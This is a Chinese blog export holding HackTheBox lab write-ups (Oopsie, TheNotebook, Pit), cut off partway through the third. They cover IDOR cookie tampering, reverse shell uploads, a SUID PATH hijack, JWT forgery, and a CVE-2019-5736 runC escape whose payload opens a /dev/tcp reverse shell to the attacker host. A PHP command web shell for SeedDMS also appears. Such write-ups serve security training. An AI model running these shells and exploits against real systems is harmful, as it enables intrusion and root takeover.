+<p>通过nmap信息搜集可以发现目标开放了22和80端口，既然开放了WEB服务，直接访问看看网站的功能和可能存在问题的点。</p>
+<p>网站按钮全部无效，页面底部有邮箱 <code>admin@megacorp.com</code>可能有用。</p>
+<p>其中有处内容存在提示</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/tips-Oopsite.png" alt="tips-Oopsite"></p>
+<p>翻译过来为：<code>我们提供服务来操作生产数据，如报价、客户请求等。请登录以获取服务。</code></p>
+<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a><strong>Burpsuite</strong></h3><p>通过<code>Burpsuite</code>截包，我们在网站地图中找到了可能的登录路径</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/login-Oopsite.png" alt="login-Oopsite"></p>
+<p>直接访问<code>http://10.10.10.28/cdn-cgi/login/</code>进入登录界面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backlogin-Oopsite.png" alt="backlogin-Oopsite"></p>
+<p>尝试登录，用户名<code>admin</code>或者<code>administrator</code></p>
+<p>密码弱口令爆破无果，看了下官方WP，密码为上一台靶机Archetype的管理员密码<code>MEGACORP_4dm1n!!</code>，登录成功。</p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>简单看了一下功能，其中<code>Uploads</code>页面提示需要超级管理员权限。</p>
+<p>那么接下来就是如何获取超级管理员权限看能否进行文件上传。</p>
+<p>其中<code>Account</code>页面可以看到当前用户信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/account-Oopsite.png" alt="account-Oopsite"></p>
+<p>再看Burpsuite中当前页面的请求包</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/request-Oopsite.png" alt="request-Oopsite"></p>
+<p><code>GET</code>参数<code>content</code>用来进行功能页面的跳转，<code>id</code>参数作用不明</p>
+<p><code>Cookie</code>中<code>user</code>、<code>role</code>分别对应<code>Access ID</code>、<code>Name</code></p>
+<p>两个方向猜测：1.是否存在sql注入 2.是否存在越权漏洞</p>
+<p>经过简单的测试发现sql注入行不通，尝试对<code>id</code>进行爆破。Payload可以用<code>Intruder</code>模块自带的<code>numbers</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/superadmin-Oopsite.png" alt="superadmin-Oopsite"></p>
+<p>结果中看到有几个id请求的响应包长度不同，其中<code>id=30</code>的响应包中发现了<code>super admin</code></p>
+<p>字样，对应的<code>Access ID</code>为<code>86575</code>，直接在URL中修改<code>id=30</code>访问<code>Account</code>页面发现确实是超级管理员账号。</p>
+<p>回到<code>Uploads</code>页面抓包，修改<code>Cookie</code>中的<code>user</code>值为<code>86575</code>发回数据包，可以上传文件了</p>
+<h2 id="文件上传反弹shell"><a href="#文件上传反弹shell" class="headerlink" title="文件上传反弹shell"></a>文件上传反弹shell</h2><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploads-Oopsite.png" alt="uploads-Oopsite"></p>
+<p>文件上传shell文件（注意抓包修改user值为超级管理员），文件上传成功但是不知道上传目录，用目录扫描工具扫一下试试</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell-Oopsite.png" alt="uploadshell-Oopsite"></p>
+<p>发现uploads路径，nc监听2333端口，curl请求test.php反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333 //shell中写的1234端口</span><br><span class="line">curl http://10.10.10.28/uploads/test.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/shell-Oopsite.png" alt="shell-Oopsite"></p>
+<p>查看各种目录文件，在<code>/var/www/html/cdn-cgi/login</code>中发现了<code>db.php</code>文件</p>
+<p>获取内容得到本地用户<code>robert</code>的账号密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dbphp-Oopsite.png" alt="dbphp-Oopsite"></p>
+<p>尝试用<code>su xxxx</code>切换用户，报错：<code>su: must be run from a terminal</code></p>
+<p>反弹的shell是个<code>非交互式shell</code>，非交互式shell会有很多问题，比如：</p>
+<ul>
+<li>无法用vim等文本编辑器</li>
+<li>不能用tab补全指令</li>
+<li>不能su</li>
+<li>不能向上使用历史</li>
+<li>…</li>
+</ul>
+<h3 id="知识点-交互式和非交互式"><a href="#知识点-交互式和非交互式" class="headerlink" title="知识点 交互式和非交互式"></a>知识点 交互式和非交互式</h3><p><strong>交互式模式</strong>：就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。</p>
+<p><strong>非交互式模式</strong>：以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾EOF，shell也就终止了。</p>
+<p>网上反弹shell升级交互式用的都是python，但是目标机子上没有python环境，然后去问了树哥，树哥说用<code>script /dev/null</code>,惊了居然su可行了！！</p>
+<p>但是这个shell不是交互式的shell，算是个半交互式，不如交互式方便但也凑合</p>
+<h3 id="知识点-script命令-和-dev-null"><a href="#知识点-script命令-和-dev-null" class="headerlink" title="知识点 script命令 和 /dev/null"></a>知识点 script命令 和 /dev/null</h3><p><strong>script命令</strong></p>
+<p>scirpt就是一个命令，可以制作一份记录输出到终端的记录</p>
+<p><strong>/dev/null</strong></p>
+<p><code>/dev/null</code>代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”</p>
+<p>用途</p>
+<p>1.丢弃标准输出</p>
+<p>2.丢弃标准错误输出</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nullpython-Oopsite.png" alt="nullpython-Oopsite"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag-Oopsite.png" alt="userflag-Oopsite"></p>
+<p>得到user的flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用<a href="https://www.runoob.com/linux/linux-comm-id.html">Linux id命令</a>发现robert所在组为bugtracker</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/id-Oopsite.png" alt="id-Oopsite"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -g bugtracker 2&gt;/dev/null #Linuxfind命令 -type 设置查找类型为文件 -g 设置组为bugtracker 2&gt;/dev/null 将错误输出到/dev/null 2为Linux文件描述符（错误输出）</span><br><span class="line">ls -al /usr/bin/bugtracker Linux ls基本命令参数不多赘述</span><br></pre></td></tr></table></figure>
+
+<p>其中有个<a href="https://www.cnblogs.com/qlqwjy/p/8665871.html">s权限</a>，当一个可执行程序具有SetUID权限，用户执行这个程序时，将以这个程序所有者的身份执行。前提是这个文件是可执行文件，可就是具有x权限(属组必须先设置相应的x权限)</p>
+<p>执行<code>/usr/bin/bugtracker</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bug1-Oopsite.png" alt="bug1-Oopsite"></p>
+<p>文件作用是 用户输入一个<code>BUG ID</code>输出BUG报告</p>
+<p>用<a href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>查看<code>/usr/bin/bugtracker</code>的执行过程</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bug2-Oopsite.png" alt="bug2-Oopsite"></p>
+<p>如箭头所指，文件执行过程中调用了<code>cat</code>命令输出<code>/root/reports/</code>目录下的BUG报告</p>
+<p>由于s权限，robert用户本来无权读取<code>/root/reports/</code>，现在可以了</p>
+<p>我们可以构造一个恶意的cat命令来提权root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH //设置环境变量到/tmp linux下的tmp目录是一个系统产生临时文件的存放目录，同时每个用户都可以对他进行读写操作</span><br><span class="line">cd /tmp/ //切换到/tmp目录下</span><br><span class="line">echo &#x27;/bin/sh&#x27; &gt; cat </span><br><span class="line">chmod +x cat //赋予执行权限</span><br></pre></td></tr></table></figure>
+
+<p>此时，再次执行<code>/usr/bin/bugtracker</code>将会调用<code>/tmp</code>目录下的恶意cat命令，此时我们再次输入任意<code>BUG ID</code>就可以用root权限执行命令了</p>
+<p><strong>注意没有变成root用户</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root-Oopsite.png" alt="root-Oopsite"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag-Oopsite.png" alt="rootflag-Oopsite"></p>
+<p>得到root的flag</p>
+<p>end</p>
+<p><strong>小结</strong></p>
+<p>总的看下来这台靶机其实不算特别难，终究是自己的知识面太狭隘</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/gui951753/article/details/79154496">https://blog.csdn.net/gui951753/article/details/79154496</a></p>
+<p><a href="https://www.cnblogs.com/aaak/p/14067593.html">https://www.cnblogs.com/aaak/p/14067593.html</a></p>
+<p><a href="https://www.linuxprobe.com/shell-dev-null.html">https://www.linuxprobe.com/shell-dev-null.html</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-theNotebook</title>
+    <url>/2022/01/07/HackTheBox-theNotebook/</url>
+    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.11</p>
+<p>目标IP：10.10.10.230</p>
+</blockquote>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
+<p>2.CVE-2019-5736 docker容器逃逸</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
+<p>还是熟悉的22和80端口，访问下网站</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
+<p>测试了一下，登录和注册界面应该不存在sql注入</p>
+<p>尝试注册admin发现用户已经存在了</p>
+<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
+<p>简单测试一下似乎也不存在xss漏洞</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
+<p>发现F12 请求头里的cookie长得很像jwt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
+<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
+<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
+<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
+<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
+<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
+<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
+<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
+<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
+<p>管理员界面有两个功能（查看Notes和文件上传）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
+<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
+<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
+<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
+<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
+<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
+<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
+<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
+<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
+
+<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
+<p>参考：</p>
+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
+<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
+<p>(1)由一个攻击者控制的恶意镜像创建</p>
+<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
+<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
+<p>通过修改payload反弹一个shell到本机以获得root</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
+<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
+<p>3.在二进制文件所在目录用python起一个web服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
+<p>4.在docker容器中执行命令从本机获取二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
+
+<p>5.赋予二进制文件最高权限，并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
+<p>6.监听9999端口（端口根据payload里面的来）</p>
+<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
+<p>root.txt在<code>/root</code>目录下</p>
+<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
+<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Pit</title>
+    <url>/2022/01/07/HackTheBox-Pit/</url>
+    <content><![CDATA[<h1 id="Hackthebox-Pit"><a href="#Hackthebox-Pit" class="headerlink" title="Hackthebox-Pit"></a>Hackthebox-Pit</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png" alt="pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>目标IP：10.10.10.241</p>
+<p>本机IP：10.10.16.12</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要想记录一下对HackTheBox靶机Pit的渗透过程，涉及以下知识点：</p>
+<p>1.snmp和snmpwalk工具使用</p>
+<p>2.CVE-2019-12744</p>
+<p>3.利用本地环境写入authorized_keys文件实现ssh免密登录root</p>
+<p>难度中上，文中如果表述或者操作有问题欢迎各位师傅指出</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_nmap.png" alt="nmap"></p>
+<p>开放了22、80、9090端口，还是从80端口开始看</p>
+<p>访问<code>10.10.10.241:80</code>只是个Nginx服务器搭建成功界面，没有可以利用的点</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/80.png" alt="80"></p>
+<p>再看下9090端口，nmap扫出来一个<code>Zeus-admin?</code>去google一下，没有文章写的很清楚。</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/9090.png" alt="9090"></p>
+<p>查看源码发现了有用信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cockpit.png" alt="cockpit"></p>
+<p>9090端口装了Cockpit</p>
+<blockquote>
+<p>Linux Cockpit 是一个基于Web 界面的应用，它提供了对系统的图形化管理。 … 它是一个用户友好的基于web 的控制台，提供了一些非常简单的方法来管理Linux 系统—— 通过web。 你可以通过一个非常简单的web 来监控系统资源、添加或删除帐户、监控系统使用情况、关闭系统以及执行其他一些其他任务。</p>
+</blockquote>
+<p>在<a href="https://www.exploit-db.com/">exp库</a>上看看有没有Cockpit的漏洞exp可利用，但是在源码中没有找到关于Cockpit的版本信息 暂时放一放</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hosts.png" alt="hosts"></p>
+<p>还找到了域名<strong>dms-pit.htb</strong>和<strong>pit.htb</strong>  加入到<code>/etc/hosts</code>里方便解析域名</p>
+<p><img src="" alt="etchost"></p>
+<p>尝试用**<a href="https://github.com/OJ/gobuster">Gobuster</a>**工具进行目录扫描，没有有用的发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://dms-pit.htb/ -w /usr/share/wordlists/dirb/big.txt -t 200 --wildcard</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_gobuster.png" alt="Pit_gobuster">做到这里我没思路了，nmap端口扫描的默认协议为TCP，实际上应该扫描一下UDP端口就有思路继续做下去了，还是经验不足吧</p>
+<p>这里卡壳了去看了下官推给的提示</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hint.png" alt="hint"></p>
+<p>这个提示我自认为不是很明显，后来找了半天原来是snmpwalk的意思</p>
+<blockquote>
+<p>snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。通过snmpwalk也可以查看支持SNMP协议（可网管）的设备的一些其他信息，比如cisco交换机或路由器IP地址、内存使用率等，也可用来协助开发SNMP功能。</p>
+<p>在日常监控中,经常会用到snmp服务,而snmpwalk命令则是采集系统各种信息最有效的方法。</p>
+</blockquote>
+<p><strong>什么是snmp？</strong></p>
+<blockquote>
+<p> <strong>SNMP</strong>是英文”<strong>Simple Network Management Protocol</strong>“的缩写，中文意思是”<strong>简单网络管理协议</strong>“。<strong>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。由于SNMP协议简单可靠 ，受到了众多厂商的欢迎，成为了目前最为广泛的网管协议。</strong></p>
+<p> SNMP 和 UDP</p>
+<p> SNMP采用UDP协议在管理端和agent之间传输信息。 SNMP采用UDP 161端口接收和发送请求，162端口接收trap，执行SNMP的设备缺省都必须采用这些端口。SNMP消息全部通过UDP端口161接收，只有Trap信息采用UDP端口162。</p>
+</blockquote>
+<p>那接下来我们应该就是通过snmpwalk得到某些信息继续做下去了</p>
+<p>扫描发现161和162端口开放</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/udp%E7%AB%AF%E5%8F%A3.png" alt="udp端口"></p>
+<p>通过<a href="https://github.com/dheiland-r7/snmp">工具</a>从目标系统中提取SNMP数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpbw.pl target community timeout threads</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snmp%E5%B7%A5%E5%85%B7.png" alt="snmp工具"></p>
+<p>得到<code>10.10.10.241.snmp</code>文件，从中发现</p>
+<blockquote>
+<p>Linux版本：Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64</p>
+<p>很多目录</p>
+<p>username：michelle</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF2.png" alt="泄露信息2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF1.png" alt="泄露信息1"></p>
+<p>搜一下seeddms，发现SeedDMS是个文档管理系统</p>
+<p>访问<code>http://dms-pit.htb/seeddms51x/seeddms</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/SeedDMS.png" alt="SeedDMS"></p>
+<p>用<code>michelle</code>这个用户测试登录，简单测试了几个密码发现密码就是用户名，成功登录SeedDMS</p>
+<p>其中发现了一个更新日志，管理员把SeedDMS的版本从5.1.10升级到了5.1.15，CHANGELOG中也显示最后的更新记录升级到了5.1.15版本，去<a href="https://www.exploit-db.com/">exp库</a>看看有无可利用的漏洞</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/changelog.png" alt="changelog"></p>
+<p>可能是官方设计的时候出了问题，整合目前可以得到的所有信息，这台机子的渗透已经做不下去了，如果真和更新日志里写的一样，5.1.15版本没有已知可用的exp。</p>
+<p>看了几篇国外大佬的博客，做到这普遍存在一个疑问就是：日志中明确写到5.1.11版本修复了 CVE-2019-12744，为什么这里CVE-2019-12744的exp还是可以利用? </p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/fixinfo.png" alt="fixinfo"></p>
+<p>没办法，就当5.1.10版本继续做下去</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>用CVE-2019-12744的exp可以实现<strong>远程命令执行</strong></p>
+<p><strong>参链</strong>：<a href="https://www.exploit-db.com/exploits/47022">https://www.exploit-db.com/exploits/47022</a></p>
+<p>SeedDMS中进入<strong>michelle</strong>用户目录下添加<code>1.php</code>文档并上传本地的<code>backdoor.php</code>,内容如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//backdoor.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        system(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_upload.png" alt="upload"></p>
+<p>添加成功以后，看一下<code>1.php</code>的文档id(URL中可一看到document_id=xxx)，接下来可以通过cmd传参执行远程命令了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd= </span><br><span class="line">#我的1.php文档ID是30 </span><br><span class="line">#这里的“data”和“1048576”是保存上传文件的默认文件夹。</span><br></pre></td></tr></table></figure>
+
+<p>查看下<code>/etc/passwd</code></p>
